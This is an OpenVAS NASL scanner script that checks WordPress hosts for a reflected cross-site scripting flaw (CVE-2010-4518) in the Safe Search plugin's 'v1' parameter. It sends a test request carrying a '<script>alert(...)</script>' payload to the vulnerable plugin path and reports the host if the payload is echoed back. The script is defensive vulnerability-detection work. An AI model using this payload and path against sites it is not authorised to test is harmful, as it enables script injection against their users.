##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_safe_search_xss_vuln.nasl 5388 2017-02-21 15:13:30Z teissa $
#
# WordPress Safe Search Plugin 'v1' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in context of an affected site.
Impact Level: Application.";

tag_affected = "WordPress Safe Search Plugin 0.7 and prior";

tag_insight = "The input passed to 'v1' parameter in
'wp-content/plugins/wp-safe-search/wp-safe-search-jx.php' script is not
properly sanitised before being returned to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running WordPress and is prone to Cross Site
Scripting Vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.801490";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5388 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 16:13:30 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-4518");
  script_bugtraq_id(45267);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Safe Search Plugin 'v1' Parameter Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42544");
  script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/WordPress.Safe.Search.0.7.Reflected.Cross-site.Scripting/66");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!wpPort){
  exit(0);
}

## Get WordPress Path from KB
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);

if(dir != NULL)
{
  # Try expliot and check response
  sndReq = http_get(item:string(dir, "/wp-content/plugins/wp-safe-search/" +
                      "wp-safe-search-jx.php?v1=<script>alert(XSS-Testing)</script>"), port:wpPort);
  rcvRes = http_send_recv(port:wpPort, data:sndReq);
  if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(XSS-Testing)</script>" >< rcvRes){
    security_message(wpPort);
  }
}
